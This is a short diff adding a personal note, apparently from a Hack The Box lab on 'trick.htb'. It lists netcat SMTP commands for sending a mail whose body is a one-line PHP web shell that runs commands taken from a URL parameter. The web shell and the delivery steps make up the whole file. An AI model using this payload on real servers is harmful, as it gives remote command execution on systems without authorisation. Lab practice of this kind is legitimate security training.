@@ -1,0 +1,19 @@
+nc trick.htb 25
+
+opening
+helo x
+
+Absender
+mail from: <Absender>
+
+Empfänger
+rcpt to: <Empfänger>
+
+beginn main message
+data
+
+main message
+<?php system($_GET['cmd']); ?>
+
+end main message
+<enter>.<enter>
